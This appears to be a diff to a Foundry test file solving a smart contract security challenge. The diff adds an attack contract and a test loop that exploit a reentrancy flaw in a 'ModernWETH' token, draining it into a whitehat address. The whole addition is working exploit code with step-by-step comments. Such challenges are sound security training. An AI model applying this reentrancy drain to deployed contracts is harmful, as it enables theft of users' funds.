@@ -9,7 +9,29 @@ import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
+contract AttackContract {
+    ModernWETH public modernWETH;
+    address public whitehat;
+    constructor(ModernWETH _modernWETH, address _whitehat) {
+        whitehat = _whitehat;
+        modernWETH = _modernWETH;
+    }
 
+    function attack() public {
+        // Step 2. attackContract will withdraw all modernWETH
+        modernWETH.withdrawAll();
+    }
+
+    fallback() external payable {
+        // Step 3. attackContract receive Ether, deposit to modernWETH and transfer out of this account. 
+        // When execution goes back to modernWETH it will burn balance of attackContract, however the balance is 0 because of the transfer out.
+        modernWETH.deposit{value: msg.value}();
+        console.log("DEPOSIT: %s", msg.value / 1e18);
+        console.log("Transfer: %s", modernWETH.balanceOf(address(this)) / 1e18);
+        modernWETH.transfer(whitehat, modernWETH.balanceOf(address(this)));
+
+    }
+}
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -39,9 +61,18 @@ contract Challenge2Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge2Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
-
+        AttackContract attackContract = new AttackContract(modernWETH, whitehat);
+        modernWETH.deposit{value: 10 ether}();
+        
+        // Step 1. send modernWETH to attackContract
+        for (; modernWETH.balanceOf(whitehat) < 1010 ether; ) {
+            modernWETH.transfer(address(attackContract), 10 ether);
+            attackContract.attack();
+            console.log("After attack() WETH balance attackContract: %s", modernWETH.balanceOf(whitehat)/1e18);
+        }
+        // Step 4. Repeat until our balance is expected 1010 ether
+        // Step 5. withdraw all our ether from modernWETH
+        modernWETH.withdrawAll();
         //==================================================//
         vm.stopPrank();
 
